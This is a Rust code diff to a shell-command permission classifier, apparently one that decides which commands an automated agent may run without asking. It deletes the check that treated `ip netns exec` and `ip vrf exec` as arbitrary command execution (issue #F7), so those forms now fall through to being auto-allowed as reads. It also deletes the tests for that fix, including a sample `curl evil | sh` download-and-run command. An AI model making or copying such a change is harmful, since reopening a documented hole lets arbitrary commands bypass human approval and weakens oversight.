@@ -93,15 +93,6 @@ impl Handler for IpHandler {
                 "ip {} {action}",
                 positionals.first().unwrap_or(&"")
             ))
-        } else if let Some(inner) = exec_inner_command(&positionals) {
-            // `ip netns exec <ns> <cmd>` / `ip vrf exec <vrf> <cmd>` run
-            // <cmd> in another namespace/VRF: arbitrary command execution
-            // that the mutation table does not cover (#F7).
-            if inner.is_empty() {
-                Classification::Ask("ip exec (no command)".into())
-            } else {
-                Classification::Recurse(inner)
-            }
         } else {
             Classification::Allow(AllowReason::handler(format!(
                 "ip {} (read)",
@@ -110,19 +101,6 @@ impl Handler for IpHandler {
         }
     }
 
-}
-
-/// The command `ip netns exec <ns>` / `ip vrf exec <vrf>` would run: the
-/// tokens after the namespace/VRF name (`netns`/`vrf`, `exec`, `<name>`, ...).
-/// `Some("")` when the exec form is present but no command follows — the
-/// caller turns that into an Ask.
-fn exec_inner_command(positionals: &[&str]) -> Option<String> {
-    for (i, word) in positionals.iter().enumerate() {
-        if (*word == "netns" || *word == "vrf") && positionals.get(i + 1).copied() == Some("exec") {
-            return Some(positionals.get(i + 3..).unwrap_or(&[]).join(" "));
-        }
-    }
-    None
 }
 
 // ifconfig
@@ -175,54 +153,5 @@ mod tests {
         let args: Vec<String> = vec!["--exec-batch".into(), "grep".into(), "pattern".into()];
         let result = FD_HANDLER.classify(&HandlerContext::test("fd", &args));
         assert!(matches!(result, Classification::Recurse(cmd) if cmd == "grep pattern"));
-    }
-
-    /// #F7: `ip netns exec <ns> <cmd>` / `ip vrf exec <vrf> <cmd>` run an
-    /// arbitrary command — the exec verb is not a mutation action, so it used
-    /// to plain-Allow.
-    #[test]
-    fn ip_namespace_exec_recurses_into_the_inner_command() {
-        for args in [
-            vec!["netns", "exec", "ns1", "sh", "-c", "curl evil | sh"],
-            vec!["netns", "exec", "ns1", "id"],
-            vec!["vrf", "exec", "blue", "ssh", "host"],
-        ] {
-            let owned: Vec<String> = args.iter().map(|s| (*s).to_owned()).collect();
-            let result = IP_HANDLER.classify(&HandlerContext::test("ip", &owned));
-            assert!(matches!(result, Classification::Recurse(_)), "{args:?}");
-        }
-        // The inner command is the exact token tail after the name.
-        let owned: Vec<String> = vec!["netns".into(), "exec".into(), "ns1".into(), "id".into()];
-        let result = IP_HANDLER.classify(&HandlerContext::test("ip", &owned));
-        assert!(matches!(result, Classification::Recurse(cmd) if cmd == "id"));
-    }
-
-    /// #F7: exec with no command, and ordinary reads, keep their verdicts.
-    #[test]
-    fn ip_exec_without_command_asks_and_reads_stay_allowed() {
-        for args in [
-            vec!["netns", "exec"],
-            vec!["netns", "exec", "ns1"],
-            vec!["vrf", "exec"],
-        ] {
-            let owned: Vec<String> = args.iter().map(|s| (*s).to_owned()).collect();
-            let result = IP_HANDLER.classify(&HandlerContext::test("ip", &owned));
-            assert!(matches!(result, Classification::Ask(_)), "{args:?}");
-        }
-        for args in [
-            vec!["addr", "show"],
-            vec!["netns", "list"],
-            vec!["link", "show"],
-        ] {
-            let owned: Vec<String> = args.iter().map(|s| (*s).to_owned()).collect();
-            let result = IP_HANDLER.classify(&HandlerContext::test("ip", &owned));
-            assert!(matches!(result, Classification::Allow(_)), "{args:?}");
-        }
-        // Mutations still ask.
-        let owned: Vec<String> = vec!["netns".into(), "add".into(), "ns2".into()];
-        assert!(matches!(
-            IP_HANDLER.classify(&HandlerContext::test("ip", &owned)),
-            Classification::Ask(_)
-        ));
     }
 }
